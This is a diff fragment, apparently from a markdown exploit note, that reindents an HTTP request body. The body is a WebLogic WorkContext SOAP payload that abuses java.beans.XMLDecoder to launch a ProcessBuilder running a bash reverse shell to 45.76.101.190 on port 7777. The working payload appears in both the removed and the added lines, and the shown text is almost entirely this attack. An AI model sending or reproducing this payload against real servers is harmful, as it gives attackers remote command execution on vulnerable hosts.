@@ -48,25 +48,28 @@ Connection: close
 Content-Type: text/xml
 Content-Length: 638
 
-<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
-<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
-<java version="1.4.0" class="java.beans.XMLDecoder">
-<void class="java.lang.ProcessBuilder">
-<array class="java.lang.String" length="3">
-<void index="0">
-<string>/bin/bash</string>
-</void>
-<void index="1">
-<string>-c</string>
-</void>
-<void index="2">
-<string>bash -i &gt;&amp; /dev/tcp/45.76.101.190/7777 0&gt;&amp;1</string>
-</void>
-</array>
-<void method="start"/></void>
-</java>
-</work:WorkContext>
-</soapenv:Header>
-<soapenv:Body/>
+<soapenv:Envelope
+    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+    <soapenv:Header>
+        <work:WorkContext
+            xmlns:work="http://bea.com/2004/06/soap/workarea/">
+            <java version="1.4.0" class="java.beans.XMLDecoder">
+                <void class="java.lang.ProcessBuilder">
+                    <array class="java.lang.String" length="3">
+                        <void index="0">
+                            <string>/bin/bash</string>
+                        </void>
+                        <void index="1">
+                            <string>-c</string>
+                        </void>
+                        <void index="2">
+                            <string>bash -i &gt;&amp; /dev/tcp/45.76.101.190/7777 0&gt;&amp;1</string>
+                        </void>
+                    </array>
+                    <void method="start"/></void>
+            </java>
+        </work:WorkContext>
+    </soapenv:Header>
+    <soapenv:Body/>
 </soapenv:Envelope>
 ```
